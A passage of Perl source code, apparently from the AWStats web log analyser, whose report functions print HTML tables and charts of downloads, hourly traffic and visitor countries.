Tooltip(3)\n\t\t\t\t\t  . \">$Message[56]</td>\";\n\t\t\t\t}\n\t\t\t\tif ( $ShowDaysOfWeekStats =~ /H/i ) {\n\t\t\t\t\tprint \"<td width=\\\"80\\\" bgcolor=\\\"#$color_h\\\"\"\n\t\t\t\t\t  . Tooltip(4)\n\t\t\t\t\t  . \">$Message[57]</td>\";\n\t\t\t\t}\n\t\t\t\tif ( $ShowDaysOfWeekStats =~ /B/i ) {\n\t\t\t\t\tprint \"<td width=\\\"80\\\" bgcolor=\\\"#$color_k\\\"\"\n\t\t\t\t\t  . Tooltip(5)\n\t\t\t\t\t  . \">$Message[75]</td></tr>\";\n\t\t\t\t}\n\t\t\t\tfor (@DOWIndex) {\n\t\t\t\t\tprint \"<tr\"\n\t\t\t\t\t  . ( $_ =~ /[06]/ ? \" bgcolor=\\\"#$color_weekend\\\"\" : \"\" )\n\t\t\t\t\t  . \">\";\n\t\t\t\t\tprint \"<td>\"\n\t\t\t\t\t  . (\n\t\t\t\t\t\t!$StaticLinks\n\t\t\t\t\t\t  && $_ == ( $nowwday - 1 )\n\t\t\t\t\t\t  && $MonthRequired == $nowmonth\n\t\t\t\t\t\t  && $YearRequired == $nowyear\n\t\t\t\t\t\t? '<span class=\"currentday\">'\n\t\t\t\t\t\t: ''\n\t\t\t\t\t  );\n\t\t\t\t\tprint $Message[ $_ + 84 ];\n\t\t\t\t\tprint(   !$StaticLinks\n\t\t\t\t\t\t  && $_ == ( $nowwday - 1 )\n\t\t\t\t\t\t  && $MonthRequired == $nowmonth\n\t\t\t\t\t\t  && $YearRequired == $nowyear ? '</span>' : '' );\n\t\t\t\t\tprint \"</td>\";\n\t\t\t\t\tif ( $ShowDaysOfWeekStats =~ /P/i ) {\n\t\t\t\t\t\tprint \"<td>\", Format_Number(int($avg_dayofweek_p[$_])), \"</td>\";\n\t\t\t\t\t}\n\t\t\t\t\tif ( $ShowDaysOfWeekStats =~ /H/i ) {\n\t\t\t\t\t\tprint \"<td>\", Format_Number(int($avg_dayofweek_h[$_])), \"</td>\";\n\t\t\t\t\t}\n\t\t\t\t\tif ( $ShowDaysOfWeekStats =~ /B/i ) {\n\t\t\t\t\t\tprint \"<td>\", Format_Bytes(int($avg_dayofweek_k[$_])),\n\t\t\t\t\t\t  \"</td>\";\n\t\t\t\t\t}\n\t\t\t\t\tprint \"</tr>\\n\";\n\t\t\t\t}\n\t\t\t\tprint \"</table>\\n<br />\\n\";\n\t\t\t}\n\n\t\t\tprint \"</center></td>\";\n\t\t\tprint \"</tr>\\n\";\n\t\t\t&tab_end();\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints the Downloads chart and table\n# Parameters:   -\n# Input:        $NewLinkParams, $NewLinkTarget\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLMainDownloads{\n\tmy $NewLinkParams = shift;\n\tmy $NewLinkTarget = shift;\n\tif (!$LevelForFileTypesDetection > 0){return;}\n\tif ($Debug) { debug( \"ShowDownloadStats\", 2 ); }\n\tmy $regext         = qr/\\.(\\w{1,6})$/;\n\tprint \"$Center<a name=\\\"downloads\\\">&nbsp;</a><br />\\n\";\n\tmy $Totalh = 0;\n\tif ($MaxNbOf{'DownloadsShown'} < 1){$MaxNbOf{'DownloadsShown'} = 10;}\t# default if undefined\n\tmy $title =\n\t  \"$Message[178] ($Message[77] $MaxNbOf{'DownloadsShown'}) &nbsp; - &nbsp; <a href=\\\"\"\n\t  . (\n\t\t$ENV{'GATEWAY_INTERFACE'}\n\t\t  || !$StaticLinks\n\t\t? XMLEncode(\"$AWScript${NewLinkParams}output=downloads\")\n\t\t: \"$StaticLinks.downloads.$StaticExt\"\n\t  )\n\t  . \"\\\"$NewLinkTarget>$Message[80]</a>\";\n\n    if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {\n        # extend the title to include the added link\n            $title = \"$title &nbsp; - &nbsp; <a href=\\\"\" . (XMLEncode(\n                \"$AddLinkToExternalCGIWrapper\" . \"?section=DOWNLOADS&baseName=$DirData/$PROG\"\n            . \"&month=$MonthRequired&year=$YearRequired&day=$DayRequired\"\n            . \"&siteConfig=$SiteConfig\" )\n            . \"\\\"$NewLinkTarget>$Message[179]</a>\");\n    }\n\t  \n\t&tab_head( \"$title\", 0, 0, 'downloads' );\n\tmy $cnt=0;\n\tfor my $u (sort {$_downloads{$b}->{'AWSTATS_HITS'} <=> $_downloads{$a}->{'AWSTATS_HITS'}}(keys %_downloads) ){\n\t\t$Totalh += $_downloads{$u}->{'AWSTATS_HITS'};\n\t\t$cnt++;\n\t\tif ($cnt > 4){last;}\n\t}\n\t# Graph the top five in a pie chart\n\tif (scalar keys %_downloads > 1){\n\t\tforeach my $pluginname ( keys %{ $PluginsLoaded{'ShowGraph'} } )\n\t\t{\n\t\t\tmy @blocklabel = ();\n\t\t\tmy @valdata = ();\n\t\t\tmy @valcolor = ($color_p);\n\t\t\tmy $cnt = 0;\n\t\t\tfor my $u (sort {$_downloads{$b}->{'AWSTATS_HITS'} <=> $_downloads{$a}->{'AWSTATS_HITS'}}(keys %_downloads) ){\n\t\t\t\tpush @valdata, ($_downloads{$u}->{'AWSTATS_HITS'} / $Totalh * 1000 ) / 10;\n\t\t\t\tpush @blocklabel, Get_Filename($u);\n\t\t\t\t$cnt++;\n\t\t\t\tif ($cnt > 4) { last; }\n\t\t\t}\n\t\t\tmy $columns = 2;\n\t\t\tif ($ShowDownloadsStats =~ /H/i){$columns += length($ShowDownloadsStats)+1;}\n\t\t\telse{$columns += length($ShowDownloadsStats);}\n\t\t\tprint \"<tr><td colspan=\\\"$columns\\\">\";\n\t\t\tmy $function = \"ShowGraph_$pluginname\";\n\t\t\t&$function(\n\t\t\t\t\"$Message[80]\",              \"downloads\",\n\t\t\t\t0, \t\t\t\t\t\t\\@blocklabel,\n\t\t\t\t0,           \t\t\t\\@valcolor,\n\t\t\t\t0,              \t\t0,\n\t\t\t\t0,          \t\t\t\\@valdata\n\t\t\t);\n\t\t\tprint \"</td></tr>\";\n\t\t}\n\t}\n\t\n\tmy $total_dls = scalar keys %_downloads;\n\tprint \"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\"><th colspan=\\\"2\\\">$Message[178]: $total_dls</th>\";\n\tif ( $ShowDownloadsStats =~ /H/i ){print \"<th bgcolor=\\\"#$color_h\\\" width=\\\"80\\\">$Message[57]</th>\"\n\t\t.\"<th bgcolor=\\\"#$color_h\\\" width=\\\"80\\\">206 $Message[57]</th>\"; }\n\tif ( $ShowDownloadsStats =~ /B/i ){\n\t\tprint \"<th bgcolor=\\\"#$color_k\\\" width=\\\"80\\\">$Message[75]</th>\";\n\t\tprint \"<th bgcolor=\\\"#$color_k\\\" width=\\\"80\\\">$Message[106]</th>\"; \n\t}\n\tprint \"</tr>\\n\";\n\tmy $count   = 0;\n\tfor my $u (sort {$_downloads{$b}->{'AWSTATS_HITS'} <=> $_downloads{$a}->{'AWSTATS_HITS'}}(keys %_downloads) ){\n\t\tprint \"<tr>\";\n\t\tmy $ext = Get_Extension($regext, $u);\n\t\tif ( !$ext) {\n\t\t\tprint \"<td\"\n\t\t\t  . ( $count ? \"\" : \" width=\\\"$WIDTHCOLICON\\\"\" )\n\t\t\t  . \"><img src=\\\"$DirIcons\\/mime\\/unknown.png\\\"\"\n\t\t\t  . AltTitle(\"\")\n\t\t\t  . \" /></td>\";\n\t\t}\n\t\telse {\n\t\t\tmy $nameicon = $MimeHashLib{$ext}[0] || \"notavailable\";\n\t\t\tmy $nametype = $MimeHashFamily{$MimeHashLib{$ext}[0]} || \"&nbsp;\";\n\t\t\tprint \"<td\"\n\t\t\t  . ( $count ? \"\" : \" width=\\\"$WIDTHCOLICON\\\"\" )\n\t\t\t  . \"><img src=\\\"$DirIcons\\/mime\\/$nameicon.png\\\"\"\n\t\t\t  . AltTitle(\"\")\n\t\t\t  . \" /></td>\";\n\t\t}\n\t\tprint \"<td class=\\\"aws\\\">\";\n\t\t&HTMLShowURLInfo($u);\n\t\tprint \"</td>\";\n\t\tif ( $ShowDownloadsStats =~ /H/i ){\n\t\t\tprint \"<td>\".Format_Number($_downloads{$u}->{'AWSTATS_HITS'}).\"</td>\";\n\t\t\tprint \"<td>\".Format_Number($_downloads{$u}->{'AWSTATS_206'}).\"</td>\";\n\t\t}\n\t\tif ( $ShowDownloadsStats =~ /B/i ){\n\t\t\tprint \"<td>\".Format_Bytes($_downloads{$u}->{'AWSTATS_SIZE'}).\"</td>\";\n\t\t\tprint \"<td>\".Format_Bytes(($_downloads{$u}->{'AWSTATS_SIZE'}/\n\t\t\t\t\t($_downloads{$u}->{'AWSTATS_HITS'} + $_downloads{$u}->{'AWSTATS_206'}))).\"</td>\";\n\t\t}\n\t\tprint \"</tr>\\n\";\n\t\t$count++;\n\t\tif ($count >= $MaxNbOf{'DownloadsShown'}){last;}\n\t}\n\t&tab_end();\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints the hours chart and table\n# Parameters:   $NewLinkParams, $NewLinkTarget\n# Input:        -\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLMainHours{\n    my $NewLinkParams = shift;\n    my $NewLinkTarget = shift;\n        \n    if ($Debug) { debug( \"ShowHoursStats\", 2 ); }\n\tprint \"$Center<a name=\\\"hours\\\">&nbsp;</a><br />\\n\";\n\tmy $title = \"$Message[20]\";\n\t\n    if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {\n       # extend the title to include the added link \n           $title = \"$title &nbsp; - &nbsp; <a href=\\\"\" . (XMLEncode(\n               \"$AddLinkToExternalCGIWrapper\" . \"?section=TIME&baseName=$DirData/$PROG\"\n           . \"&month=$MonthRequired&year=$YearRequired&day=$DayRequired\"\n           . \"&siteConfig=$SiteConfig\" )\n           . \"\\\"$NewLinkTarget>$Message[179]</a>\");\n    } \n\t\n\tif ( $PluginsLoaded{'GetTimeZoneTitle'}{'timezone'} ) {\n\t\t$title .= \" (GMT \"\n\t\t  . ( GetTimeZoneTitle_timezone() >= 0 ? \"+\" : \"\" )\n\t\t  . int( GetTimeZoneTitle_timezone() ) . \")\";\n\t}\n\t&tab_head( \"$title\", 19, 0, 'hours' );\n\tprint \"<tr><td align=\\\"center\\\">\\n\";\n\tprint \"<center>\\n\";\n\n\tmy $max_h = my $max_k = 1;\n\tfor ( my $ix = 0 ; $ix <= 23 ; $ix++ ) {\n\n\t\t#if ($_time_p[$ix]>$max_p) { $max_p=$_time_p[$ix]; }\n\t\tif ( $_time_h[$ix] > $max_h ) { $max_h = $_time_h[$ix]; }\n\t\tif ( $_time_k[$ix] > $max_k ) { $max_k = $_time_k[$ix]; }\n\t}\n\n\t# Show bars for hour\n\tmy $graphdone=0;\n\tforeach my $pluginname ( keys %{ $PluginsLoaded{'ShowGraph'} } )\n\t{\n\t\tmy @blocklabel = ( 0 .. 23 );\n\t\tmy @vallabel   =\n\t\t  ( \"$Message[56]\", \"$Message[57]\", \"$Message[75]\" );\n\t\tmy @valcolor = ( \"$color_p\", \"$color_h\", \"$color_k\" );\n\t\tmy @valmax = ( int($max_h), int($max_h), int($max_k) );\n\t\tmy @valtotal   = ( $TotalPages,   $TotalHits,   $TotalBytes );\n\t\tmy @valaverage = ( $AveragePages, $AverageHits, $AverageBytes );\n\t\tmy @valdata    = ();\n\t\tmy $xx         = 0;\n\t\tfor ( 0 .. 23 ) {\n\t\t\t$valdata[ $xx++ ] = $_time_p[$_] || 0;\n\t\t\t$valdata[ $xx++ ] = $_time_h[$_] || 0;\n\t\t\t$valdata[ $xx++ ] = $_time_k[$_] || 0;\n\t\t}\n\t\tmy $function = \"ShowGraph_$pluginname\";\n\t\t&$function(\n\t\t\t\"$title\",        \"hours\",\n\t\t\t$ShowHoursStats, \\@blocklabel,\n\t\t\t\\@vallabel,      \\@valcolor,\n\t\t\t\\@valmax,        \\@valtotal,\n\t\t\t\\@valaverage,    \\@valdata\n\t\t);\n\t\t$graphdone=1;\n\t}\n\tif (! $graphdone) \n\t{\n\t\tprint \"<table>\\n\";\n\t\tprint \"<tr valign=\\\"bottom\\\">\\n\";\n\t\tfor ( my $ix = 0 ; $ix <= 23 ; $ix++ ) {\n\t\t\tmy $bredde_p = 0;\n\t\t\tmy $bredde_h = 0;\n\t\t\tmy $bredde_k = 0;\n\t\t\tif ( $max_h > 0 ) {\n\t\t\t\t$bredde_p =\n\t\t\t\t  int( $BarHeight * $_time_p[$ix] / $max_h ) + 1;\n\t\t\t}\n\t\t\tif ( $max_h > 0 ) {\n\t\t\t\t$bredde_h =\n\t\t\t\t  int( $BarHeight * $_time_h[$ix] / $max_h ) + 1;\n\t\t\t}\n\t\t\tif ( $max_k > 0 ) {\n\t\t\t\t$bredde_k =\n\t\t\t\t  int( $BarHeight * $_time_k[$ix] / $max_k ) + 1;\n\t\t\t}\n\t\t\tprint \"<td>\";\n\t\t\tif ( $ShowHoursStats =~ /P/i ) {\n\t\t\t\tprint\n\"<img align=\\\"bottom\\\" src=\\\"$DirIcons\\/other\\/$BarPng{'vp'}\\\" height=\\\"$bredde_p\\\" width=\\\"6\\\"\"\n\t\t\t\t  . AltTitle( \"$Message[56]: \" . int( $_time_p[$ix] ) )\n\t\t\t\t  . \" />\";\n\t\t\t}\n\t\t\tif ( $ShowHoursStats =~ /H/i ) {\n\t\t\t\tprint\n\"<img align=\\\"bottom\\\" src=\\\"$DirIcons\\/other\\/$BarPng{'vh'}\\\" height=\\\"$bredde_h\\\" width=\\\"6\\\"\"\n\t\t\t\t  . AltTitle( \"$Message[57]: \" . int( $_time_h[$ix] ) )\n\t\t\t\t  . \" />\";\n\t\t\t}\n\t\t\tif ( $ShowHoursStats =~ /B/i ) {\n\t\t\t\tprint\n\"<img align=\\\"bottom\\\" src=\\\"$DirIcons\\/other\\/$BarPng{'vk'}\\\" height=\\\"$bredde_k\\\" width=\\\"6\\\"\"\n\t\t\t\t  . AltTitle(\n\t\t\t\t\t\"$Message[75]: \" . Format_Bytes( $_time_k[$ix] ) )\n\t\t\t\t  . \" />\";\n\t\t\t}\n\t\t\tprint \"</td>\\n\";\n\t\t}\n\t\tprint \"</tr>\\n\";\n\n\t\t# Show hour lib\n\t\tprint \"<tr\" . Tooltip(17) . \">\";\n\t\tfor ( my $ix = 0 ; $ix <= 23 ; $ix++ ) {\n\t\t\tprint \"<th width=\\\"19\\\">$ix</th>\\n\"\n\t\t\t  ;   # width=19 instead of 18 to avoid a MacOS browser bug.\n\t\t}\n\t\tprint \"</tr>\\n\";\n\n\t\t# Show clock icon\n\t\tprint \"<tr\" . Tooltip(17) . \">\\n\";\n\t\tfor ( my $ix = 0 ; $ix <= 23 ; $ix++ ) {\n\t\t\tmy $hrs = ( $ix >= 12 ? $ix - 12 : $ix );\n\t\t\tmy $hre = ( $ix >= 12 ? $ix - 11 : $ix + 1 );\n\t\t\tmy $apm = ( $ix >= 12 ? \"pm\"     : \"am\" );\n\t\t\tprint\n\"<td><img src=\\\"$DirIcons\\/clock\\/hr$hre.png\\\" width=\\\"12\\\" alt=\\\"$hrs:00 - $hre:00 $apm\\\" /></td>\\n\";\n\t\t}\n\t\tprint \"</tr>\\n\";\n\t\tprint \"</table>\\n\";\n\t}\n\tprint \"<br />\\n\";\n\n\t# Show data array for hours\n\tif ($AddDataArrayShowHoursStats) {\n\t\tprint \"<table width=\\\"650\\\"><tr>\\n\";\n\t\tprint \"<td align=\\\"center\\\"><center>\\n\";\n\n\t\tprint \"<table>\\n\";\n\t\tprint\n\"<tr><td width=\\\"80\\\" bgcolor=\\\"#$color_TableBGRowTitle\\\">$Message[20]</td>\";\n\t\tif ( $ShowHoursStats =~ /P/i ) {\n\t\t\tprint \"<td width=\\\"80\\\" bgcolor=\\\"#$color_p\\\"\"\n\t\t\t  . Tooltip(3)\n\t\t\t  . \">$Message[56]</td>\";\n\t\t}\n\t\tif ( $ShowHoursStats =~ /H/i ) {\n\t\t\tprint \"<td width=\\\"80\\\" bgcolor=\\\"#$color_h\\\"\"\n\t\t\t  . Tooltip(4)\n\t\t\t  . \">$Message[57]</td>\";\n\t\t}\n\t\tif ( $ShowHoursStats =~ /B/i ) {\n\t\t\tprint \"<td width=\\\"80\\\" bgcolor=\\\"#$color_k\\\"\"\n\t\t\t  . Tooltip(5)\n\t\t\t  . \">$Message[75]</td>\";\n\t\t}\n\t\tprint \"</tr>\";\n\t\tfor ( my $ix = 0 ; $ix <= 11 ; $ix++ ) {\n\t\t\tmy $monthix = ( $ix < 10 ? \"0$ix\" : \"$ix\" );\n\t\t\tprint \"<tr>\";\n\t\t\tprint \"<td>$monthix</td>\";\n\t\t\tif ( $ShowHoursStats =~ /P/i ) {\n\t\t\t\tprint \"<td>\",\n\t\t\t\t  Format_Number($_time_p[$monthix] ? $_time_p[$monthix] : \"0\"),\n\t\t\t\t  \"</td>\";\n\t\t\t}\n\t\t\tif ( $ShowHoursStats =~ /H/i ) {\n\t\t\t\tprint \"<td>\",\n\t\t\t\t  Format_Number($_time_h[$monthix] ? $_time_h[$monthix] : \"0\"),\n\t\t\t\t  \"</td>\";\n\t\t\t}\n\t\t\tif ( $ShowHoursStats =~ /B/i ) {\n\t\t\t\tprint \"<td>\", Format_Bytes( int( $_time_k[$monthix] ) ),\n\t\t\t\t  \"</td>\";\n\t\t\t}\n\t\t\tprint \"</tr>\\n\";\n\t\t}\n\t\tprint \"</table>\\n\";\n\n\t\tprint \"</center></td>\";\n\t\tprint \"<td width=\\\"10\\\">&nbsp;</td>\";\n\t\tprint \"<td align=\\\"center\\\"><center>\\n\";\n\n\t\tprint \"<table>\\n\";\n\t\tprint\n\"<tr><td width=\\\"80\\\" bgcolor=\\\"#$color_TableBGRowTitle\\\">$Message[20]</td>\";\n\t\tif ( $ShowHoursStats =~ /P/i ) {\n\t\t\tprint \"<td width=\\\"80\\\" bgcolor=\\\"#$color_p\\\"\"\n\t\t\t  . Tooltip(3)\n\t\t\t  . \">$Message[56]</td>\";\n\t\t}\n\t\tif ( $ShowHoursStats =~ /H/i ) {\n\t\t\tprint \"<td width=\\\"80\\\" bgcolor=\\\"#$color_h\\\"\"\n\t\t\t  . Tooltip(4)\n\t\t\t  . \">$Message[57]</td>\";\n\t\t}\n\t\tif ( $ShowHoursStats =~ /B/i ) {\n\t\t\tprint \"<td width=\\\"80\\\" bgcolor=\\\"#$color_k\\\"\"\n\t\t\t  . Tooltip(5)\n\t\t\t  . \">$Message[75]</td>\";\n\t\t}\n\t\tprint \"</tr>\\n\";\n\t\tfor ( my $ix = 12 ; $ix <= 23 ; $ix++ ) {\n\t\t\tmy $monthix = ( $ix < 10 ? \"0$ix\" : \"$ix\" );\n\t\t\tprint \"<tr>\";\n\t\t\tprint \"<td>$monthix</td>\";\n\t\t\tif ( $ShowHoursStats =~ /P/i ) {\n\t\t\t\tprint \"<td>\",\n\t\t\t\t  Format_Number($_time_p[$monthix] ? $_time_p[$monthix] : \"0\"),\n\t\t\t\t  \"</td>\";\n\t\t\t}\n\t\t\tif ( $ShowHoursStats =~ /H/i ) {\n\t\t\t\tprint \"<td>\",\n\t\t\t\t  Format_Number($_time_h[$monthix] ? $_time_h[$monthix] : \"0\"),\n\t\t\t\t  \"</td>\";\n\t\t\t}\n\t\t\tif ( $ShowHoursStats =~ /B/i ) {\n\t\t\t\tprint \"<td>\", Format_Bytes( int( $_time_k[$monthix] ) ),\n\t\t\t\t  \"</td>\";\n\t\t\t}\n\t\t\tprint \"</tr>\\n\";\n\t\t}\n\t\tprint \"</table>\\n\";\n\n\t\tprint \"</center></td></tr></table>\\n\";\n\t\tprint \"<br />\\n\";\n\t}\n\n\tprint \"</center></td></tr>\\n\";\n\t&tab_end();\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints the countries chart and table\n# Parameters:   $NewLinkParams, $NewLinkTarget\n# Input:        -\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLMainCountries{\n\tmy $NewLinkParams = shift;\n\tmy $NewLinkTarget = shift;\n\t\n\tif ($Debug) { debug( \"ShowDomainsStats\", 2 ); }\n\tprint \"$Center<a name=\\\"countries\\\">&nbsp;</a><br />\\n\";\n\tmy $title =\n\"$Message[25] ($Message[77] $MaxNbOf{'Domain'}) &nbsp; - &nbsp; <a href=\\\"\"\n\t  . (\n\t\t$ENV{'GATEWAY_INTERFACE'}\n\t\t  || !$StaticLinks\n\t\t? XMLEncode(\"$AWScript${NewLinkParams}output=alldomains\")\n\t\t: \"$StaticLinks.alldomains.$StaticExt\"\n\t  )\n\t  . \"\\\"$NewLinkTarget>$Message[80]</a>\";\n\t  \n\n    if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {\n       # extend the title to include the added link\n           $title = \"$title &nbsp; - &nbsp; <a href=\\\"\" . (XMLEncode(\n               \"$AddLinkToExternalCGIWrapper\" . \"?section=DOMAIN&baseName=$DirData/$PROG\"\n           . \"&month=$MonthRequired&year=$YearRequired&day=$DayRequired\"\n           . \"&siteConfig=$SiteConfig\" )\n           . \"\\\"$NewLinkTarget>$Message[179]</a>\");\n    }\n        \t  \n\t&tab_head( \"$title\", 19, 0, 'countries' );\n\t\n\tmy $total_u = my $total_v = my $total_p = my $total_h = my $total_k = 0;\n\tmy $max_h = 1;\n\tforeach ( values %_domener_h ) {\n\t\tif ( $_ > $max_h ) { $max_h = $_; }\n\t}\n\tmy $max_k = 1;\n\tforeach ( values %_domener_k ) {\n\t\tif ( $_ > $max_k ) { $max_k = $_; }\n\t}\n\tmy $count = 0;\n\t\n\t&BuildKeyList(\n\t\t$MaxNbOf{'Domain'}, $MinHit{'Domain'},\n\t\t\\%_domener_h,       \\%_domener_p\n\t);\n\t\n\t# print the map\n\tif (scalar @keylist > 1){\n\t\tforeach my $pluginname ( keys %{ $PluginsLoaded{'ShowGraph'} } )\n\t\t{\n\t\t\tmy @blocklabel = ();\n\t\t\tmy @valdata = ();\n\t\t\tmy $cnt = 0;\n\t\t\tforeach my $key (@keylist) {\n\t\t\t\tpush @valdata, int( $_domener_h{$key} );\n\t\t\t\tpush @blocklabel, $DomainsHashIDLib{$key};\n\t\t\t\t$cnt++;\n\t\t\t\tif ($cnt > 99) { last; }\n\t\t\t}\n\t\t\tprint \"<tr><td colspan=\\\"7\\\" align=\\\"center\\\">\";\n\t\t\tmy $function = \"ShowGraph_$pluginname\";\n\t\t\t&$function(\n\t\t\t\t\"AWStatsCountryMap\",              \"countries_map\",\n\t\t\t\t0, \t\t\t\t\t\t\\@blocklabel,\n\t\t\t\t0,           \t\t\t0,\n\t\t\t\t0,              \t\t0,\n\t\t\t\t0,          \t\t\t\\@valdata\n\t\t\t);\n\t\t\tprint \"</td></tr>\";\n\t\t}\n\t}\n\t\n\tprint\n\"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\"><th width=\\\"$WIDTHCOLICON\\\">&nbsp;</th><th colspan=\\\"2\\\">$Message[17]</th>\";\n\n\t## to add unique visitors and number of visits by calculation of average of the relation with total\n\t## pages and total hits, and total visits and total unique\n\t## by Josep Ruano @ CAPSiDE\n\tif ( $ShowDomainsStats =~ /U/i ) {\n\t\tprint \"<th bgcolor=\\\"#$color_u\\\" width=\\\"80\\\"\"\n\t\t  . Tooltip(2)\n\t\t  . \">$Message[11]</th>\";\n\t}\n\tif ( $ShowDomainsStats =~ /V/i ) {\n\t\tprint \"<th bgcolor=\\\"#$color_v\\\" width=\\\"80\\\"\"\n\t\t  . Tooltip(1)\n\t\t  . \">$Message[10]</th>\";\n\t}\n\tif ( $ShowDomainsStats =~ /P/i ) {\n\t\tprint \"<th bgcolor=\\\"#$color_p\\\" width=\\\"80\\\"\"\n\t\t  . Tooltip(3)\n\t\t  . \">$Message[56]</th>\";\n\t}\n\tif ( $ShowDomainsStats =~ /H/i ) {\n\t\tprint \"<th bgcolor=\\\"#$color_h\\\" width=\\\"80\\\"\"\n\t\t  . Tooltip(4)\n\t\t  . \">$Message[57]</th>\";\n\t}\n\tif ( $ShowDomainsStats =~ /B/i ) {\n\t\tprint \"<th bgcolor=\\\"#$color_k\\\" width=\\\"80\\\"\"\n\t\t  . Tooltip(5)\n\t\t  . \">$Message[75]</th>\";\n\t}\n\tprint \"<th>&nbsp;</th>\";\n\tprint \"</tr>\\n\";\n\t\n\tforeach my $key (@keylist) {\n\t\tmy ( $_domener_u, $_domener_v );\n\t\tmy $bredde_p = 0;\n\t\tmy $bredde_h = 0;\n\t\tmy $bredde_k = 0;\n\t\tmy $bredde_u = 0;\n\t\tmy $bredde_v = 0;\n\t\tif ( $max_h > 0 ) {\n\t\t\t$bredde_p =\n\t\t\t  int( $BarWidth * $_domener_p{$key} / $max_h ) + 1;\n\t\t}    # use max_h to enable to compare pages with hits\n\t\tif ( $_domener_p{$key} && $bredde_p == 1 ) { $bredde_p = 2; }\n\t\tif ( $max_h > 0 ) {\n\t\t\t$bredde_h =\n\t\t\t  int( $BarWidth * $_domener_h{$key} / $max_h ) + 1;\n\t\t}\n\t\tif ( $_domener_h{$key} && $bredde_h == 1 ) { $bredde_h = 2; }\n\t\tif ( $max_k > 0 ) {\n\t\t\t$bredde_k =\n\t\t\t  int( $BarWidth * ( $_domener_k{$key} || 0 ) / $max_k ) +\n\t\t\t  1;\n\t\t}\n\t\tif ( $_domener_k{$key} && $bredde_k == 1 ) { $bredde_k = 2; }\n\t\tmy $newkey = lc($key);\n\t\tif ( $newkey eq 'ip' || !$DomainsHashIDLib{$newkey} ) {\n\t\t\tprint\n\"<tr><td width=\\\"$WIDTHCOLICON\\\"><img src=\\\"$DirIcons\\/flags\\/ip.png\\\" height=\\\"14\\\"\"\n\t\t\t  . AltTitle(\"$Message[0]\")\n\t\t\t  . \" /></td><td class=\\\"aws\\\">$Message[0]</td><td>$newkey</td>\";\n\t\t}\n\t\telse {\n\t\t\tprint\n\"<tr><td width=\\\"$WIDTHCOLICON\\\"><img src=\\\"$DirIcons\\/flags\\/$newkey.png\\\" height=\\\"14\\\"\"\n\t\t\t  . AltTitle(\"$newkey\")\n\t\t\t  . \" /></td><td class=\\\"aws\\\">$DomainsHashIDLib{$newkey}</td><td>$newkey</td>\";\n\t\t}\n\t\t## to add unique visitors and number of visits, by Josep Ruano @ CAPSiDE\n\t\tif ( $ShowDomainsStats =~ /U/i ) {\n\t\t\t$_domener_u = (\n\t\t\t\t  $_domener_p{$key}\n\t\t\t\t? $_domener_p{$key} / $TotalPages\n\t\t\t\t: 0\n\t\t\t);\n\t\t\t$_domener_u += ( $_domener_h{$key} / $TotalHits );\n\t\t\t$_domener_u =\n\t\t\t  sprintf( \"%.0f\", ( $_domener_u * $TotalUnique ) / 2 );\n\t\t\tprint \"<td>\".Format_Number($_domener_u).\" (\"\n\t\t\t  . sprintf( \"%.1f%\", 100 * $_domener_u / $TotalUnique )\n\t\t\t  . \")</td>\";\n\t\t}\n\t\tif ( $ShowDomainsStats =~ /V/i ) {\n\t\t\t$_domener_v = (\n\t\t\t\t  $_domener_p{$key}\n\t\t\t\t? $_domener_p{$key} / $TotalPages\n\t\t\t\t: 0\n\t\t\t);\n\t\t\t$_domener_v += ( $_domener_h{$key} / $TotalHits );\n\t\t\t$_domener_v =\n\t\t\t  sprintf( \"%.0f\", ( $_domener_v * $TotalVisits ) / 2 );\n\t\t\tprint \"<td>\".Format_Number($_domener_v).\" (\"\n\t\t\t  . sprintf( \"%.1f%\", 100 * $_domener_v / $TotalVisits )\n\t\t\t  . \")</td>\";\n\t\t}\n\n\t\tif ( $ShowDomainsStats =~ /P/i ) {\n\t\t\tprint \"<td>\"\n\t\t\t  . ( $_domener_p{$key} ? Format_Number($_domener_p{$key}) : '&nbsp;' )\n\t\t\t  . \"</td>\";\n\t\t}\n\t\tif ( $ShowDomainsStats =~ /H/i ) {\n\t\t\tprint \"<td>\".Format_Number($_domener_h{$key}).\"</td>\";\n\t\t}\n\t\tif ( $ShowDomainsStats =~ /B/i ) {\n\t\t\tprint \"<td>\" . Format_Bytes( $_domener_k{$key} ) . \"</td>\";\n\t\t}\n\t\tprint \"<td class=\\\"aws\\\">\";\n\n\t\tif ( $ShowDomainsStats =~ /P/i ) {\n\t\t\tprint\n\"<img src=\\\"$DirIcons\\/other\\/$BarPng{'hp'}\\\" width=\\\"$bredde_p\\\" height=\\\"5\\\"\"\n\t\t\t  . AltTitle(\"\")\n\t\t\t  . \" /><br />\\n\";\n\t\t}\n\t\tif ( $ShowDomainsStats =~ /H/i ) {\n\t\t\tprint\n\"<img src=\\\"$DirIcons\\/other\\/$BarPng{'hh'}\\\" width=\\\"$bredde_h\\\" height=\\\"5\\\"\"\n\t\t\t  . AltTitle(\"\")\n\t\t\t  . \" /><br />\\n\";\n\t\t}\n\t\tif ( $ShowDomainsStats =~ /B/i ) {\n\t\t\tprint\n\"<img src=\\\"$DirIcons\\/other\\/$BarPng{'hk'}\\\" width=\\\"$bredde_k\\\" height=\\\"5\\\"\"\n\t\t\t  . AltTitle(\"\") . \" />\";\n\t\t}\n\t\tprint \"</td>\";\n\t\tprint \"</tr>\\n\";\n\n\t\t$total_u += $_domener_u;\n\t\t$total_v += $_domener_v;\n\t\t$total_p += $_domener_p{$key};\n\t\t$total_h += $_domener_h{$key};\n\t\t$total_k += $_domener_k{$key} || 0;\n\t\t$count++;\n\t}\n\tmy $rest_u = $TotalUnique - $total_u;\n\tmy $rest_v = $TotalVisits - $total_v;\n\tmy $rest_p = $TotalPages - $total_p;\n\tmy $rest_h = $TotalHits - $total_h;\n\tmy $rest_k = $TotalBytes - $total_k;\n\tif (   $rest_u > 0\n\t\t|| $rest_v > 